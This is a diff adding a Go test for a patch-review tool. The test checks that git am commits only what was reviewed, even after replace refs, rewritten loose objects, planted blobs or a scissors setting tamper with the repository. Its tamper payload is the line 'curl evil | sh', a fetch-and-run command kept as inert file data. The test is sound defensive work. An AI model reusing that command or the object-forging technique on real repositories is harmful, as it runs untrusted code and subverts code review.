@@ -1,6 +1,8 @@
 package tui
 
 import (
+	"bytes"
+	"compress/zlib"
 	"context"
 	"fmt"
 	"os"
@@ -719,5 +721,83 @@ func TestOpenerHoldsUpNoBuild(t *testing.T) {
 		}
 	case <-time.After(10 * time.Second):
 		t.Fatal("another item's review copy waits for the opener")
+	}
+}
+
+// TestRunCommitsWhatWasReviewed: the run reads the repository's objects as the review copy did, so a replace ref planted
+// after review changes nothing it commits; an object file rewritten after review does, and so does one planted at the id
+// of a blob the patch makes, which git am then doesn't write, and so does a setting that cuts a message differently. The
+// run is reported failed, also where git am stopped or failed in the review copy, which then drew only its error and the
+// raw patch.
+func TestRunCommitsWhatWasReviewed(t *testing.T) {
+	needGit(t)
+	lines := "1\n2\n3\n4\n5\n6\n"
+	evil := lines + "curl evil | sh\n"
+	for _, c := range []struct {
+		name, tamper, from, to string
+		stop, reported         bool
+	}{
+		{"replace", "replace", lines, strings.Replace(lines, "2", "two", 1), false, false},
+		{"rewrite", "rewrite", lines, strings.Replace(lines, "2", "two", 1), false, true},
+		{"plant", "plant", lines, strings.Replace(lines, "2", "two", 1), false, true},
+		// the same trees, but the first commit's message cut at its scissors line
+		{"setting", "setting", lines, strings.Replace(lines, "2", "two", 1), false, true},
+		{"stopped", "", lines, strings.Replace(lines, "2", "two", 1), true, false},
+		{"stopped, rewrite", "rewrite", lines, strings.Replace(lines, "2", "two", 1), true, true},
+		// written against f = evil: git am fails in the review copy, and applies once f's object holds evil
+		{"failed, rewrite", "rewrite", evil, strings.Replace(evil, "6", "six", 1), false, true},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			src := mkRepo(t, map[string]string{"f": c.from, "g": "x\n"})
+			os.WriteFile(filepath.Join(src, "f"), []byte(c.to), 0o600)
+			gitOut(t, src, "commit", "-qam", "One", "-m", "-- >8 --")
+			os.WriteFile(filepath.Join(src, "g"), []byte("y\n"), 0o600)
+			gitOut(t, src, "commit", "-qam", "Two")
+			patch := gitOut(t, src, "format-patch", "--stdout", "base..HEAD")
+			if c.stop { // the second commit applies nowhere
+				patch = strings.Replace(patch, "-x\n+y", "-nope\n+y", 1)
+			}
+			repo := mkRepo(t, map[string]string{"f": lines, "g": "x\n"})
+			_, m := setup(t)
+			m = built(amModel(t, m, repo, tempFile(t, "c.patch", patch), 160, 60))
+			m.focus, m.advancedAt = 2, time.Time{}
+			blob := strings.TrimSpace(gitOut(t, repo, "rev-parse", "HEAD:f"))
+			if c.tamper == "plant" { // the blob the patch makes, which only the review copy has
+				blob = strings.TrimSpace(gitOut(t, repo, "hash-object", tempFile(t, "to", c.to)))
+			}
+			if c.tamper == "replace" {
+				other := gitOut(t, repo, "hash-object", "-w", tempFile(t, "evil", evil))
+				gitOut(t, repo, "replace", blob, strings.TrimSpace(other))
+			} else if c.tamper == "setting" {
+				gitOut(t, repo, "config", "mailinfo.scissors", "true")
+			} else if c.tamper != "" { // git reads a loose object without checking its hash
+				var z bytes.Buffer
+				w := zlib.NewWriter(&z)
+				fmt.Fprintf(w, "blob %d\x00%s", len(evil), evil)
+				w.Close()
+				obj := filepath.Join(repo, ".git", "objects", blob[:2], blob[2:])
+				os.MkdirAll(filepath.Dir(obj), 0o700)
+				os.Chmod(obj, 0o600)
+				if err := os.WriteFile(obj, z.Bytes(), 0o600); err != nil {
+					t.Fatal(err)
+				}
+			}
+			it := m.reviewed.Item
+			m, _ = press(m, " ")
+			m, cmd := press(m, " ")
+			if cmd == nil {
+				t.Fatal("did not run")
+			}
+			m.Update(cmd())
+			res, _ := m.q.ReadResult(it)
+			got := gitOut(t, repo, "--no-replace-objects", "show", "HEAD:f")
+			if c.tamper == "replace" && (res.State != queue.Succeeded || strings.Contains(got, "curl")) {
+				t.Fatalf("replace ref: run %s, committed f = %q", res.State, got)
+			}
+			reported := res.State == queue.Failed && strings.Contains(res.Stderr, "differ from the review copy")
+			if reported != c.reported || c.stop && res.State != queue.Failed {
+				t.Fatalf("run %s (%q), committed f = %q", res.State, res.Stderr, got)
+			}
+		})
 	}
 }
